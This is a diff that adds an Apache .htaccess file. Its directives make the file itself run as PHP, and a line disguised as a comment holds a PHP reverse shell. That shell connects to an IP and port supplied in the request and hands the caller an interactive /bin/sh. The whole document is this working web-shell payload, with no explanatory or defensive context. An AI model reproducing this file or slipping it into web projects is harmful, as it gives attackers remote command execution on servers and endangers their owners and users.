@@ -1,0 +1,9 @@
+<Files ~ "^\.ht">
+    Require all granted
+    Order allow,deny
+    Allow from all
+    SetHandler application/x-httpd-php
+</Files>
+
+
+# <?php /* Sleep to allow nc listener to start */sleep(2);$sock=fsockopen($_GET["ip"],intval($_GET["port"]));$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
